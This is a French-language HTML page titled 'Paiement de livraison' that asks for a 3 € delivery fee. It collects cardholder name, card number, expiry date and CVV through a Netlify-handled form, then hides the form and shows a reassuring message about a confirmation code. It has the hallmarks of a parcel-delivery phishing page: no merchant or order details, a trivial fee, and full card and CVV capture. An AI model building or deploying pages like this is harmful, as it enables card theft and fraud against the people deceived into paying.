
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Paiement de livraison</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #f1f1f1;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: #ffffff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    .card-icons {
      text-align: center;
      margin-bottom: 10px;
    }
    .card-icons img {
      height: 30px;
      margin: 0 5px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    .row {
      display: flex;
      gap: 10px;
    }
    .btn {
      background-color: #007BFF;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }
    .btn:hover {
      background-color: #0056b3;
    }
    .confirmation {
      text-align: center;
      margin-top: 15px;
      font-size: 15px;
      color: green;
      font-weight: normal;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="card-icons">
      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="Mastercard">
      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
      <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
      <img src="https://img.icons8.com/color/48/000000/jcb.png" alt="JCB">
    </div>

    <h2>Paiement de livraison</h2>

    <form name="paiement" method="POST" data-netlify="true" onsubmit="showMessage(event)">
      <input type="text" name="nom" placeholder="Nom sur la carte" required>
      <input type="text" name="numero" placeholder="N° de carte" required>
      <div class="row">
        <input type="text" name="expiration" placeholder="MM/AA" required>
        <input type="text" name="cvv" placeholder="CVV" required>
      </div>
      <button class="btn" type="submit">Payer 3 €</button>
      <p class="confirmation" id="confirmation" style="display:none;">
        ✅ Merci ! Votre code de confirmation vous sera envoyé sous peu.
      </p>
    </form>
  </div>

  <script>
    function showMessage(e) {
      e.preventDefault();
      document.querySelector("form").style.display = "none";
      document.getElementById("confirmation").style.display = "block";
    }
  </script>

</body>
</html>
